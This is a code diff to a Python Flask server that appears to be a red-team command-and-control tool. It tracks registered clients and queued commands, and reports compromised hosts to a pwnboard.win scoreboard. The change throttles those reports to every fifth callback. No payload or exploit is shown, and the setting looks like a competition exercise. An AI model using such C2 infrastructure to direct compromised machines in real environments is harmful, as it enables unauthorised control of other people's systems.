@@ -13,6 +13,7 @@ print("Drew was here")
 client_commands = {} # 'client_id': 'command', 'timestamp', 'output (default none)' --> to handle commands for specific clients
 clients = [] # just to see what clients we got rn
 groups = {} # for same box diff teams
+callback_counter = {} # 'id':'number'
 
 
 @app.route('/home')
@@ -59,6 +60,7 @@ def send_command():
 @app.route('/register-client', methods=['GET'])
 def register_client(client_id=None):
     global groups
+    global callback_counter
     if not client_id:
     # client_id = request.remote_addr # ok just found out u could do this
         client_id = request.args.get('client_id') # retrieves the value associated with the key 'client_id' from the query string, or None if it does not exist
@@ -67,6 +69,7 @@ def register_client(client_id=None):
         groups[group] = []
     if client_id not in groups:
         groups[group].append(client_id)
+    callback_counter[client_id] = 0
 
     global clients
     if client_id not in clients:
@@ -105,6 +108,10 @@ def show_clients():
     return clients
 
 def sendUpdate(ips, name="leahfr"):
+    global callback_counter
+    callback_counter[ips] += 1
+    if callback_counter[ips] % 5 != 0:
+        return 
     host = "https://pwnboard.win/pwn/boxaccess"
     # Here ips is a list of IP addresses to update
     # If we are only updating 1 IP, use "ip" and pass a string
